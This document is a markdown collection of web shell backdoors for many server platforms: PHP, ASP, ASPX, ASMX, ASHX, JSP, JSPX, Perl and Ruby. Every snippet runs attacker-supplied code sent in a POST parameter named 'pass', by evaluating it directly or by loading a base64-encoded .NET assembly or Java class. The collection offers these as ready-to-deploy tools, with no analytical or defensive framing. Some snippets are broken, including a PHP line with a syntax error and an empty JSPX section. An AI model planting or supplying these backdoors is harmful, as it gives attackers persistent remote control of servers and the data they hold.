# PHP

```PHP
<?php @eval($_POST['pass');?>
```

# ASP

```ASP
<%eval request("pass")%>
```

# .NET
# ASPX(JScript)

```ASPX
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```

## ASPX(C#)

```C#
<%@ Page Language="C#" ResponseEncoding="utf-8" %>
<%@ Import Namespace="System.Reflection" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.HttpMethod == "POST")
        {
            try
            {
                string passData = Request.Form["pass"];

                if (!string.IsNullOrEmpty(passData))
                {
                    byte[] dllBytes = Convert.FromBase64String(passData.Trim());
                    Assembly assembly = Assembly.Load(dllBytes);

                    object instance = null;
                    Type targetType = null;

                    foreach (Type t in assembly.GetTypes())
                    {
                        if (t.Name == "Cmd")
                        {
                            targetType = t;
                            break;
                        }
                    }

                    if (targetType == null)
                    {
                        targetType = assembly.GetTypes()[0];
                        Response.Write("[!] Warning: Could not find a class named 'Cmd'. Falling back to the first class: " + targetType.FullName + "<br/>"); 
                    }

                    instance = Activator.CreateInstance(targetType);
                    instance.Equals(null); 
                    
                    Response.Write("[*] Notice: Class " + targetType.FullName + " finished execution but returned no data.");
                }
                else
                {
                    Response.Write("ASPX Error: pass parameter is empty.");
                }
            }
            catch (Exception ex)
            {
                Response.Write("ASPX Top Error: " + ex.ToString());
            }
        }
    }
</script>
```

## ASMX

```C#
<%@ WebService Language="C#" Class="ScriptMethodSpy" %>

using System;
using System.Web;
using System.Web.Services;
using System.Reflection;

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class ScriptMethodSpy : System.Web.Services.WebService
{
    [WebMethod]
    public void Invoke(string pass)
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return;

        if (context.Request.HttpMethod != "POST" || string.IsNullOrEmpty(context.Request.Form["pass"]))
        {
            context.Response.Clear();
            context.Response.ContentType = "text/html";
            context.Response.Write("");
            context.Response.Flush();
            context.ApplicationInstance.CompleteRequest();
            return;
        }

        try
        {
            byte[] dllBytes = Convert.FromBase64String(pass.Trim());
            Assembly assembly = Assembly.Load(dllBytes);

            Type targetType = null;
            foreach (Type t in assembly.GetTypes())
            {
                if (t.Name == "Cmd")
                {
                    targetType = t;
                    break;
                }
            }

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                instance.Equals(null);
            }
        }
        catch (Exception)
        {
            context.Response.Clear();
            context.ApplicationInstance.CompleteRequest();
        }
    }
}
```

## ASHX

```C#
<%@ WebHandler Language="C#" Class="backdoor" %>

using System;
using System.Web;
using System.Reflection;

public class backdoor : IHttpHandler 
{
    public void ProcessRequest(HttpContext context) 
    {
        if (context.Request.HttpMethod == "POST")
        {
            try
            {
                string passData = context.Request.Form["pass"];

                if (!string.IsNullOrEmpty(passData))
                {
                    byte[] dllBytes = Convert.FromBase64String(passData.Trim());

                    Assembly assembly = Assembly.Load(dllBytes);

                    Type targetType = null;
                    foreach (Type t in assembly.GetTypes())
                    {
                        if (t.Name == "Cmd") { targetType = t; break; }
                    }

                    if (targetType != null)
                    {
                        object instance = Activator.CreateInstance(targetType);
                        instance.Equals(null);
                    }
                }
            }
            catch (Exception ex)
            {
                context.Response.Write("ASHX Error: " + ex.Message);
            }
        }
    }
 
    public bool IsReusable {
        get { return true; }
    }
}
```

# Java
## JSP

Nashorn:
```JSP
<%@ page import="javax.script.*" %>
<%
    if (request.getMethod().equals("POST")) {
        String code = request.getParameter("pass");
        if (code != null) {
            ScriptEngineManager manager = new ScriptEngineManager();
            ScriptEngine engine = manager.getEngineByName("js");
            
            engine.put("response", response); 
            engine.put("request", request);
            
            try {
                engine.eval(code);
            } catch (Exception e) {
                response.getWriter().println("Engine Error: " + e.getMessage());
            }
        }
    }
%>
```

---

ClassLoader:
```Java
<%@page import="java.util.*,java.io.*" %>
<%!
public static class U extends ClassLoader {
    public U(ClassLoader c) { super(c); }
    public Class g(byte[] b) { return super.defineClass(null, b, 0, b.length); }
}
%>
<%
if ("POST".equalsIgnoreCase(request.getMethod())) {
    try {
        String passData = request.getParameter("pass");
        if (passData != null && !passData.isEmpty()) {
            byte[] classBytes = Base64.getDecoder().decode(passData.trim());
            out.clear();
            out = pageContext.pushBody();
            
            new U(this.getClass().getClassLoader()).g(classBytes).newInstance().equals(pageContext);
        }
    } catch (Exception e) {
        response.getWriter().write("JSP Error: " + e.getMessage());
    }
}
%>
```

## JSPX

Nashorn:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
    <jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" import="javax.script.*" />
    
    <jsp:scriptlet>
        <![CDATA[
        if (request.getMethod().equals("POST")) {
            String code = request.getParameter("pass");
            if (code != null) {
                ScriptEngineManager manager = new ScriptEngineManager();
                ScriptEngine engine = manager.getEngineByName("js");
                
                engine.put("response", response); 
                engine.put("request", request);
                
                try {
                    engine.eval(code);
                } catch (Exception e) {
                    response.getWriter().println("Engine Error: " + e.getMessage());
                }
            }
        }
        ]]>
    </jsp:scriptlet>
</jsp:root>
```

---

ClassLoader:
```

```
 
# Perl

```Perl
use CGI;eval(CGI->new->param('test'));
```

# Ruby

Recommanded:

```Ruby
require 'uri'; $_POST = URI.decode_www_form(STDIN.read(ENV['CONTENT_LENGTH'].to_i)).to_h rescue {}; eval($_POST['pass']) if $_POST['pass']
```

---

No recommanded:
```Ruby
STDIN.read(ENV['CONTENT_LENGTH'].to_i).to_s =~ /pass=([^&]+)/; eval($1.gsub('+',' ').gsub(/%([a-fA-F0-9]{2})/){[$1.hex].pack('C')}) if $1
```

